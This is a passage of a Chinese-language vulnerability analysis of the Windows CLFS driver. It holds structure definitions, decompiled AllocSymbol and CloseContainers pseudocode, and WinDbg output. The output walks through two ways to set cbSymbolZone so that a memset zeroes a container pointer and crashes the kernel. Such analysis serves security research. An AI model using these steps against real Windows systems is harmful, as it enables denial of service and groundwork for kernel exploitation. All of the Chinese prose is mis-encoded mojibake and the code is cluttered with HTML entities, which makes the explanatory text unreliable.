CLFS_METADATA_RECORD_HEADER, * PCLFS_METADATA_RECORD_HEADER; typedef struct _CLFS_BASE_RECORD_HEADER { CLFS_METADATA_RECORD_HEADER hdrBaseRecord; CLFS_LOG_ID cidLog; ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE]; ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE]; ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE]; ULONG cNextContainer; CLFS_CLIENT_ID cNextClient; ULONG cFreeContainers; ULONG cActiveContainers; ULONG cbFreeContainers; ULONG cbBusyContainers; ULONG rgClients[MAX_CLIENTS_DEFAULT]; ULONG rgContainers[MAX_CONTAINERS_DEFAULT]; ULONG cbSymbolZone; ULONG cbSector; USHORT bUnused; CLFS_LOG_STATE eLogState; UCHAR cUsn; UCHAR cClients; } CLFS_BASE_RECORD_HEADER, * PCLFS_BASE_RECORD_HEADER; å†…å­˜å¸ƒå±€ï¼š\næ­¤æ¬¡æ¼æ´é‡ç‚¹å­—æ®µï¼š\nrgContainers\nå­˜å‚¨äº†CLFS_CONTAINER_CONTEXTæ•°ç»„ç›¸å¯¹äºåŸºæœ¬å—çš„åç§»\nrgClients\nå­˜å‚¨äº†_CLFS_CLIENT_CONTEXT æ•°ç»„ç›¸å¯¹äºåŸºæœ¬å—çš„åç§»\ncbSymbolZone\nè¡¨ç¤ºç¬¦å·åŒºä¸­ä¸‹ä¸€ä¸ªå¯ç”¨çš„ç©ºé—²åç§»é‡ï¼Œç”¨äºå­˜å‚¨æ–°ç¬¦å·ã€‚\nåŸºæœ¬è®°å½•ä¸­ï¼Œclient context, container context, shared security contextç”±symbolsè¡¨ç¤ºï¼Œåœ¨symbolså‰é¢æ˜¯CLFSHASHSYMç»“æ„\ntypedef struct _CLFS_NODE_ID { ULONG cType; ULONG cbNode; } CLFS_NODE_ID, *PCLFS_NODE_ID; typedef struct _CLFSHASHSYM { CLFS_NODE_ID cidNode; ULONG ulHash; ULONG cbHash; ULONGLONG ulBelow; ULONGLONG ulAbove; LONG cbSymName; LONG cbOffset; BOOLEAN fDeleted; } CLFSHASHSYM, *PCLFSHASHSYM; å†…å­˜å¸ƒå±€\nåœ¨åŸºæœ¬è®°å½•ä¸­ï¼Œclient contextæ ‡ç¤ºä¸€ä¸ªæ—¥å¿—æ–‡ä»¶çš„clientã€‚client contextç»“æ„å¦‚ä¸‹\ntypedef struct _CLFS_NODE_ID { ULONG cType; ULONG cbNode; } CLFS_NODE_ID, *PCLFS_NODE_ID; typedef struct _CLFS_CLIENT_CONTEXT { CLFS_NODE_ID cidNode; CLFS_CLIENT_ID cidClient; USHORT fAttributes; ULONG cbFlushThreshold; ULONG cShadowSectors; ULONGLONG cbUndoCommitment; LARGE_INTEGER llCreateTime; LARGE_INTEGER llAccessTime; LARGE_INTEGER llWriteTime; CLFS_LSN lsnOwnerPage; CLFS_LSN lsnArchiveTail; CLFS_LSN lsnBase; CLFS_LSN lsnLast; CLFS_LSN lsnRestart; CLFS_LSN lsnPhysicalBase; CLFS_LSN lsnUnused1; CLFS_LSN lsnUnused2; CLFS_LOG_STATE eState; //+0x78 union { HANDLE hSecurityContext; ULONGLONG ullAlignment; }; } CLFS_CLIENT_CONTEXT, *PCLFS_CLIENT_CONTEXT; container contextç»“æ„å’Œæ—¥å¿—æ–‡ä»¶æ·»åŠ å®¹å™¨æœ‰å…³ï¼Œcontainer contextç»“æ„\ntypedef struct _CLFS_CONTAINER_CONTEXT { CLFS_NODE_ID cidNode; //8 bytes ULONGLONG cbContainer; //8 bytes CLFS_CONTAINER_ID cidContainer; // 4 bytes CLFS_CONTAINER_ID cidQueue; // 4 bytes union { CClfsContainer* pContainer; //8 bytes ULONGLONG ullAlignment; }; CLFS_USN usnCurrent; CLFS_CONTAINER_STATE eState; ULONG cbPrevOffset; //4 bytes ULONG cbNextOffset; //4 bytes } CLFS_CONTAINER_CONTEXT, *PCLFS_CONTAINER_CONTEXT; å†…å­˜å¸ƒå±€\nå…¶ä¸­pContaineræ˜¯æŒ‡å‘CClfsContainerå¯¹è±¡çš„æŒ‡é’ˆ\næ¼æ´ç‚¹\nè¯¥å¤„è·å–é€šè¿‡GetBaseLogRecordå‡½æ•°è·å–BaseLogRecordï¼Œä¹‹åçš„cbSymbolZoneï¼Œåˆ¤æ–­cbSymbolZone+v4æ˜¯å¦å¤§äºSignaturesOffsetçš„ï¼Œå¦‚æœåˆ¤æ–­é€šè¿‡åˆ™é€šè¿‡memsetå°†BaseLogRecord+cbSymbolZoneå†…å­˜æ¸…é›¶ï¼Œå¤§å°ä¸ºv4ã€‚\n__int64 __fastcall CClfsBaseFilePersisted::AllocSymbol(CClfsBaseFilePersisted *this, unsigned int a2, void **a3) { __int64 v4; // rbp CLFS_BASE_RECORD_HEADER *BaseLogRecord; // rax __int64 v6; // r8 thisæŒ‡é’ˆ CLFS_BASE_RECORD_HEADER *v7; // rdi CLFS_LOG_BLOCK_HEADER *v8; // rcx __int64 cbSymbolZone; // r8 char *v10; // rbx __int64 result; // rax v4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8+ v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; // ffff970a`4995b000 15 00 03 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... // ffff970a`4995b010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ // ffff970a`4995b020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... // ffff970a`4995b030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ // ffff970a`4995b060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... // ffff970a`4995b070 05 00 00 00 00 00 00 00-aa fb b6 33 fa f9 ed 11 ...........3.... v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); v7-\u0026gt;cbSymbolZone += v4; result = 0i64; *a3 = v10; return result; } å½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º Windows 10 21H2 windbg æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åŸºäºè¯¥æ¼æ´ç‚¹æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œç¬¬ä¸€ç§å°†cbSymbolZoneä¿®æ”¹ä¸ºè‡ªèº«çš„CLFS_CONTAINER_CONTEXT-\u0026gt;pContainerç»“æ„åç§»ï¼Œç”±äºCLFS_CONTAINER_CONTEXTå†…å­˜æœ‰Container contextå¯¹è±¡æŒ‡é’ˆã€‚ä½¿ç”¨memsetæ¸…ç©ºè¯¥æŒ‡é’ˆï¼Œå½“è§£å¼•ç”¨è¯¥æŒ‡é’ˆå°†è§¦å‘å¼‚å¸¸ï¼Œå¯¼è‡´è“å±ã€‚\nç¬¬äºŒç§å°†cbSymbolZone ä¿®æ”¹ä¸ºä¸‹ä¸ªBLFæ–‡ä»¶çš„CLFS_CONTAINER_CONTEXT-\u0026gt;pContainerç»“æ„åç§»ï¼Œåˆ©ç”¨æ¼æ´å°†è¯¥æŒ‡é’ˆæ¸…é›¶ï¼Œè§£å¼•ç”¨ç¬¬äºŒä¸ªBLFæ–‡ä»¶çš„CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer å°†å¯¼è‡´è“å±ï¼Œè¿™ç§æ–¹å¼åˆ©ç”¨éœ€è¦ç»•è¿‡(char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8+ v8-\u0026gt;SignaturesOffset)\nç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼\nåœ¨è°ƒè¯•ä¸­å‘ç°CLFS_CONTAINER_CONTEXTç»“æ„è·ç¦»CLFS_BASE_RECORD_HEADERç»“æŸä¸º0x128ï¼ŒpContaineræŒ‡é’ˆè·ç¦»CLFS_BASE_RECORD_HEADERä¸º0x130ï¼Œæ­¤å¤„è¦æ¸…ç©ºé«˜å››ä½ï¼ˆå†…æ ¸è§£å¼•ç”¨æŒ‡é’ˆä¼šæ ¡éªŒæŒ‡é’ˆæ˜¯å¦ä¸ºNULLï¼Œæ‰€ä»¥ä¸èƒ½æŠŠæ‰€æœ‰çš„ä½éƒ½æ¸…é›¶ï¼‰ï¼Œåˆ™åº”è®¾ä¸º144ã€‚\n1: kd\u0026gt; dq ffff970a4995c4d0 ffff970a`4995c4d0 00000030`c1fdf008 00000000`00080000 ffff970a`4995c4e0 00000000`00000000 00000000`45f7cd40 ffff970a`4995c4f0 00000000`00000000 00000000`00000000 ffff970a`4995c500 00000000`00000000 00000000`00000000 ffff970a`4995c510 00000000`00000000 00000000`00000000 ffff970a`4995c520 00000000`00000000 00000000`00000000 ffff970a`4995c530 00000000`00000000 00000000`00000000 ffff970a`4995c540 00000000`00000000 00000000`00000000 1: kd\u0026gt; rr8 r8=000000000000000c 1: kd\u0026gt; rrdi rdi=ffff970a4995b070 1: kd\u0026gt; ?ffff970a`4995c4d0-ffff970a4995b070 Evaluate expression: 5216 = 00000000`00001460 1: kd\u0026gt; ?00000000`00001460-0x1338 Evaluate expression: 296 = 00000000`00000128 åœ¨clfs!CClfsBaseFilePersisted::AllocSymbolä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPoC\nbp clfs!CClfsBaseFilePersisted::AllocSymbol CLFS!CClfsBaseFilePersisted::AllocSymbolé€šè¿‡è°ƒç”¨CLFS!CClfsBaseFile::GetBaseLogRecordè·å–åˆ°äº†åŸºæœ¬è®°å½•å¤´ï¼Œå¯ä»¥çœ‹åˆ°_CLFS_BASE_RECORD_HEADERâ†’cbSymbolZoneå·²è¢«è®¾ä¸º144\n1: kd\u0026gt; db rax ffffbd84`4f383070 05 00 00 00 00 00 00 00-a1 a9 21 b4 31 0f ee 11 ..........!.1... ffffbd84`4f383080 bc 69 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 .i..)..2........ ffffbd84`4f383090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830c0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbd84`4f3830d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3830e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax + 0x1328 ffffbd84`4f384398 44 01 00 00 00 00 00 00-00 00 03 01 01 00 00 00 D............... ffffbd84`4f3843a8 06 f0 fd c1 30 00 00 00-16 00 d2 02 b8 00 00 00 ....0........... ffffbd84`4f3843b8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3843c8 f0 13 00 00 68 13 00 00-00 00 00 00 00 00 00 00 ....h........... ffffbd84`4f3843d8 07 f0 fd c1 88 00 00 00-00 00 00 01 40 9c 00 00 ............@... ffffbd84`4f3843e8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f3843f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbd84`4f384408 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ è€Œåå¯¹BaseLogRecord+0x1338+cbSymbolZoneå¤„å¤§å°ä¸ºv4çš„å†…å­˜è°ƒç”¨memsetæ¸…é›¶\nv4 = a2; BaseLogRecord = (CLFS_BASE_RECORD_HEADER *)CClfsBaseFile::GetBaseLogRecord(this); v7 = BaseLogRecord; if ( !BaseLogRecord ) return 3222929421i64; v8 = *(CLFS_LOG_BLOCK_HEADER **)(*(_QWORD *)(v6 + 48) + 48i64); *a3 = 0i64; cbSymbolZone = BaseLogRecord-\u0026gt;cbSymbolZone; if ( (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone + v4 \u0026gt; (char *)(\u0026amp;v8-\u0026gt;MajorVersion + v8-\u0026gt;SignaturesOffset) ) return 3221225507i64; v10 = (char *)\u0026amp;BaseLogRecord[1] + cbSymbolZone; memset(v10, 0, (unsigned int)v4); åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°rcxæŒ‡å‘äº†CLFS_CONTAINER_CONTEXT-\u0026gt;pContainer çš„é«˜å››ä½ã€‚\n1: kd\u0026gt; dd rcx - 0x1c ffffbd84`4f3844d0 c1fdf008 00000030 00080000 00000000 ffffbd84`4f3844e0 00000000 00000000 4bd8b7c0 ffffbd84 ffffbd84`4f3844f0 00000001 00000002 00000000 00000000 ffffbd84`4f384500 003f005c 005c003f 003a0043 0055005c ffffbd84`4f384510 00650073 00730072 0050005c 00620075 ffffbd84`4f384520 0069006c 005c0063 0063002e 006e006f ffffbd84`4f384530 00610074 006e0069 00720065 0031005f ffffbd84`4f384540 00310034 00000000 00000000 00000000 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::AllocSymbol+0x67: fffff801`270d0207 e874c8fcff call CLFS!memset (fffff801`2709ca80) fffff801`270d020c 01af28130000 add dword ptr [rdi+1328h],ebp fffff801`270d0212 33c0 xor eax,eax fffff801`270d0214 48891e mov qword ptr [rsi],rbx fffff801`270d0217 488b5c2430 mov rbx,qword ptr [rsp+30h] fffff801`270d021c 488b6c2438 mov rbp,qword ptr [rsp+38h] fffff801`270d0221 488b742440 mov rsi,qword ptr [rsp+40h] fffff801`270d0226 4883c420 add rsp,20h ç»§ç»­è¿è¡Œï¼Œmemsetå·²ç»å°†è¯¥æŒ‡é’ˆçš„é«˜å››ä½æ¸…é›¶\n1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::AllocSymbol+0x6c: fffff801`270d020c 01af28130000 add dword ptr [rdi+1328h],ebp 1: kd\u0026gt; dd ffffbd84`4f3844d0 ffffbd84`4f3844d0 c1fdf008 00000030 00080000 00000000 ffffbd84`4f3844e0 00000000 00000000 4bd8b7c0 00000000 ffffbd84`4f3844f0 00000000 00000000 00000000 00000000 ffffbd84`4f384500 00000000 00000000 00000000 00000000 ffffbd84`4f384510 00000000 00000000 00000000 00000000 ffffbd84`4f384520 00000000 00000000 00000000 00000000 ffffbd84`4f384530 00000000 00000000 00000000 00000000 ffffbd84`4f384540 00000000 00000000 00000000 00000000 ç»§ç»­è¿è¡Œåˆ™è§¦å‘å¼‚å¸¸\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 ffffb807`d4c5f6d8 fffff801`28112c22 nt!DbgBreakPointWithStatus 01 ffffb807`d4c5f6e0 fffff801`28112206 nt!KiBugCheckDebugBreak+0x12 02 ffffb807`d4c5f740 fffff801`27ff89c7 nt!KeBugCheck2+0x946 03 ffffb807`d4c5fe50 fffff801`2800a869 nt!KeBugCheckEx+0x107 04 ffffb807`d4c5fe90 fffff801`28009cbc nt!KiBugCheckDispatch+0x69 05 ffffb807`d4c5ffd0 fffff801`280017af nt!KiSystemServiceHandler+0x7c 06 ffffb807`d4c60010 fffff801`27ee2467 nt!RtlpExecuteHandlerForException+0xf 07 ffffb807`d4c60040 fffff801`27ee1066 nt!RtlDispatchException+0x297 08 ffffb807`d4c60760 fffff801`2800a9ac nt!KiDispatchException+0x186 09 ffffb807`d4c60e20 fffff801`28006b43 nt!KiExceptionDispatch+0x12c 0a ffffb807`d4c61000 fffff801`270cb2d5 nt!KiPageFault+0x443 0b ffffb807`d4c61190 fffff801`27098655 CLFS!CClfsContainer::Close+0xd 0c ffffb807`d4c611c0 fffff801`270987b6 CLFS!CClfsLogFcbPhysical::CloseContainers+0x69 0d ffffb807`d4c611f0 fffff801`27098761 CLFS!CClfsLogFcbPhysical::Finalize+0x42 0e ffffb807`d4c61220 fffff801`270bdf42 CLFS!CClfsLogFcbPhysical::Release+0xb1 0f ffffb807`d4c61280 fffff801`270c0878 CLFS!CClfsRequest::Close+0xd6 10 ffffb807`d4c612d0 fffff801`270c0747 CLFS!ClfsDispatchIoRequest+0x108 11 ffffb807`d4c61320 fffff801`27eabac5 CLFS!CClfsDriver::LogIoDispatch+0x27 12 ffffb807`d4c61350 fffff801`281f088f nt!IofCallDriver+0x55 13 ffffb807`d4c61390 fffff801`28219af0 nt!IopDeleteFile+0x14f 14 ffffb807`d4c61410 fffff801`27eae1a7 nt!ObpRemoveObjectRoutine+0x80 15 ffffb807`d4c61470 fffff801`28222449 nt!ObfDereferenceObjectWithTag+0xc7 16 ffffb807`d4c614b0 fffff801`282e3745 nt!ObCloseHandleTableEntry+0x6c9 17 ffffb807`d4c615f0 fffff801`2828fadd nt!ExSweepHandleTable+0xd5 18 ffffb807`d4c616a0 fffff801`282b6d98 nt!ObKillProcess+0x35 19 ffffb807`d4c616d0 fffff801`282760f6 nt!PspRundownSingleProcess+0x204 1a ffffb807`d4c61760 fffff801`282777f8 nt!PspExitThread+0x5f6 1b ffffb807`d4c61860 fffff801`27eb4d77 nt!KiSchedulerApcTerminate+0x38 1c ffffb807`d4c618a0 fffff801`27ffce90 nt!KiDeliverApc+0x487 1d ffffb807`d4c61950 fffff801`2800a35f nt!KiInitiateUserApc+0x70 1e ffffb807`d4c61a90 00007ffd`40c90994 nt!KiSystemServiceExit+0x9f 1f 0000005f`4e1ffa88 00007ffd`40c42dc7 ntdll!NtWaitForWorkViaWorkerFactory+0x14 20 0000005f`4e1ffa90 00007ffd`40497034 ntdll!TppWorkerThread+0x2f7 21 0000005f`4e1ffd90 00000000`00000000 0x00007ffd`40497034 åˆ°CClfsLogFcbPhysical::CloseContainersæŸ¥çœ‹ä¼ªä»£ç å¯çŸ¥ï¼Œé€šè¿‡CClfsBaseFile::AcquireContainerContextå‡½æ•°è·å–åˆ°container contextå¹¶å­˜åœ¨v7å˜é‡ä¸­ï¼Œè€Œåå°†v7â†’pContaineræŒ‡é’ˆå–å‡ºï¼Œå¦‚æœè¯¥æŒ‡é’ˆä¸ä¸ºé›¶åˆ™å°†å…¶ä¼ å…¥CClfsContainer::Close\n__int64 __fastcall CClfsLogFcbPhysical::CloseContainers(CClfsLogFcbPhysical *this) { int v1; // esi unsigned int v2; // edi struct _CLFS_CONTAINER_CONTEXT *v4; // rbp CClfsContainer *v5; // rcx struct _CLFS_CONTAINER_CONTEXT *v7; // [rsp+30h] [rbp+8h] BYREF v7 = 0i64; v1 = 0; v2 = *((_DWORD *)this + 341); if ( v2 \u0026gt;= *((_DWORD *)this + 340) ) return (unsigned int)v1; while ( 1 ) { v1 = CClfsBaseFile::AcquireContainerContext( *((CClfsBaseFile **)this + 85), *((_DWORD *)this + (v2 \u0026amp; 0x3FF) + 342), \u0026amp;v7); if ( v1 \u0026lt; 0 ) break; v4 = v7; if ( !v7 ) break; v5 = (CClfsContainer *)*((_QWORD *)v7 + 3); if ( v5 ) { CClfsContainer::Close(v5); (*(void (__fastcall **)(_QWORD))(**((_QWORD **)v4 + 3) + 8i64))(*((_QWORD *)v4 + 3)); *((_QWORD *)v4 + 3) = 0i64; } CClfsBaseFile::ReleaseContainerContext(*((CClfsBaseFile **)this + 85), \u0026amp;v7); if ( ++v2 \u0026gt;= *((_DWORD *)this + 340) ) return (unsigned int)v1; } return 3222929421i64; } ç”±äºå‰é¢å°†è¿™ä¸ªæŒ‡é’ˆçš„é«˜å››ä½æ¸…é›¶ï¼Œæ‰€ä»¥ä¼ å…¥CClfsContainer::Closeå‡½æ•°çš„æŒ‡é’ˆä¸º0x03\n1: kd\u0026gt; rrcx rcx=0000000000000003 1: kd\u0026gt; u CLFS!CClfsLogFcbPhysical::CloseContainers+0x69: fffff801`27098655 488b4d18 mov rcx,qword ptr [rbp+18h] fffff801`27098659 488b01 mov rax,qword ptr [rcx] fffff801`2709865c 488b4008 mov rax,qword ptr [rax+8] fffff801`27098660 ff156abf0100 call qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff801`270b45d0)] fffff801`27098666 4883651800 and qword ptr [rbp+18h],0 fffff801`2709866b 488b8ba8020000 mov rcx,qword ptr [rbx+2A8h] fffff801`27098672 488d542430 lea rdx,[rsp+30h] fffff801`27098677 e8cc9d0200 call CLFS!CClfsBaseFile::ReleaseContainerContext (fffff801`270c2448) åœ¨CClfsContainer::Closeå‡½æ•°å†…å¯¹è¯¥æŒ‡é’ˆè§£å¼•ç”¨ï¼Œå¯¼è‡´å¼‚å¸¸\nCLFS!CClfsContainer::Close: fffff801`270cb2c8 48895c2408 mov qword ptr [rsp+8], rbx fffff801`270cb2cd 57 push rdi fffff801`270cb2ce 4883ec20 sub rsp, 20h fffff801`270cb2d2 488bd9 mov rbx, rcx fffff801`270cb2d5 488b4920 mov rcx, qword ptr [rcx+20h] ç¬¬äºŒç§æ–¹å¼\nç¬¬äºŒç§æ–¹å¼æ˜¯ä¿®æ”¹cbSymbolZone ä¸ºè¶…å¤§çš„å€¼ï¼Œä½¿å¾—BaseLogRecord+0x1338+cbSymbolZone èƒ½å¤Ÿåˆ°è¾¾ä¸‹ä¸€ä¸ªBaseLogRecordçš„container contextï¼Œå¹¶åˆ©ç”¨memsetå°†container_contextâ†’pContaineræŒ‡é’ˆçš„é«˜å››ä½æ¸…é›¶ã€‚\nåœ¨CLFS!CClfsBaseFilePersisted::ReadMetadataBlockæ–­ç‚¹\nbp CLFS!CClfsBaseFilePersisted::ReadMetadataBlock è¿è¡ŒPoCï¼Œåœ¨ReadMetadataBlockæ–­ä¸‹\n1: kd\u0026gt; rrdx rdx=0000000000007a00 1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`53916f50 fffff806`62d9a395 CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa 01 fffff389`53916ff0 fffff806`62d9a204 CLFS!CClfsBaseFile::AcquireMetadataBlock+0x45 02 fffff389`53917020 fffff806`62d99c36 CLFS!CClfsBaseFilePersisted::ReadImage+0x1e8 03 fffff389`53917080 fffff806`62d62da2 CLFS!CClfsBaseFilePersisted::OpenImage+0x2fa 04 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0x326 05 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 06 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 07 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 08 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 09 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 0a fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 0b fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 0c fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0d fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0e fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 0f fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 10 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 11 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 12 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa: fffff806`62d940ba e8a1e02104 call nt!ExAllocatePoolWithTag (fffff806`66fb2160) fffff806`62d940bf 488bf0 mov rsi,rax fffff806`62d940c2 4889442438 mov qword ptr [rsp+38h],rax fffff806`62d940c7 4885c0 test rax,rax ReadMetadataBlockè°ƒç”¨nt!ExAllocatePoolWithTagåˆ†é…å†…æ ¸å †å­˜å‚¨åŸºæœ¬è®°å½•ï¼Œè°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°å†…å­˜åˆ†é…åœ¨ffffab0523ecf000\n1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaf: fffff806`62d940bf 488bf0 mov rsi,rax 1: kd\u0026gt; rrax rax=ffffab0523ecf000 åœ¨ä¸‹é¢ä¸¤ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹\nba w8 ffffab0523ecf000+0x68 ba w8 ffffab0523ecf000+0x200*0xE-0x8 è¿™ä¸¤ä¸ªåœ°æ–¹åˆ†åˆ«æ˜¯LogBlockHeaderâ†’SignatureOffsetå’Œç¬¬åå››ä¸ªæ‰‡åŒºç­¾åçš„ä½ç½®(0xc*0x200 + 0x1fe)\nç»§ç»­è¿è¡Œï¼Œåœ¨ç¬¬äºŒä¸ªæ–­ç‚¹æ–­ä¸‹ï¼Œè°ƒç”¨æ ˆï¼š\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff389`539170c0 fffff806`62d63672 CLFS!CClfsLogFcbPhysical::ResetLog+0x100 01 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xbf6 02 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef 03 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97 04 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87 05 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 06 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55 07 fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34 08 fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d 09 fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe 0a fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa 0b fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f 0c fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79 0d fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25 0e 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14 0f 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199 1: kd\u0026gt; ub CLFS!CClfsLogFcbPhysical::ResetLog+0xd7: fffff806`62d7151b 48894140 mov qword ptr [rcx+40h],rax fffff806`62d7151f 488b83d8010000 mov rax,qword ptr [rbx+1D8h] fffff806`62d71526 48894148 mov qword ptr [rcx+48h],rax fffff806`62d7152a 488b83e8010000 mov rax,qword ptr [rbx+1E8h] fffff806`62d71531 48894150 mov qword ptr [rcx+50h],rax fffff806`62d71535 488b83f0010000 mov rax,qword ptr [rbx+1F0h] **fffff806`62d7153c 48894158 mov qword ptr [rcx+58h],rax** fffff806`62d71540 806178df and byte ptr [rcx+78h],0DFh 1: kd\u0026gt; rrcx rcx=ffffab0523ed0ba0 ç»§ç»­è¿è¡Œï¼Œrcx+0x58çš„ä½ç½®å·²ç»è¢«0xFFFFFFFF00000000è¦†ç›–äº†ï¼Œè€Œrcx+0x5e = ffffab0523ecf000 + 0xd * 0x200 + 0x1FEï¼Œä¹Ÿå°±æ˜¯rcx+0x5eä½äºç¬¬åå››æ‰‡åŒºç­¾åå¤„ï¼Œæ­¤æ—¶è¿™ä¸ªç­¾åå·²ç»è¢«0xFFFFè¦†ç›–äº†ã€‚\n1: kd\u0026gt; db rcx ffffab05`23ed0ba0 07 f0 fd c1 88 00 00 00-00 00 00 01 00 00 00 00 ................ ffffab05`23ed0bb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bc0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bd0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0be0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0bf0 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffab05`23ed0c00 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffab05`23ed0c10 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ å¯¹åº”ä¼ªä»£ç å¦‚ä¸‹\n__int64 __fastcall CClfsLogFcbPhysical::ResetLog(CClfsLogFcbPhysical *this) { struct _CLFS_CLIENT_CONTEXT *v2; // rcx . *((CLFS_LSN *)this + 62) = CLFS_LSN_INVALID; // FF FF FF FF 00 00 00 00 ..... v2-\u0026gt;lsnRestart.Internal = *((_QWORD *)this + 62);// 58hçš„åç§» v2-\u0026gt;eState \u0026amp;= ~0x20u; CClfsBaseFile::ReleaseClientContext(*((CClfsBaseFile **)this + 85), \u0026amp;v7); CClfsBaseFilePersisted::ResetContainerQ( *((CClfsBaseFilePersisted **)this + 85), (unsigned int *const)this + 342, v4, (unsigned int *)this + 340, (unsigned int *)this + 341); v5 = CClfsBaseFilePersisted::IncrementUsn(*((CClfsBaseFilePersisted **)this + 85)); v6 = (CClfsBaseFilePersisted *)*((_QWORD *)this + 85); *((_BYTE *)this + 657) = v5; *((_BYTE *)this + 657) = 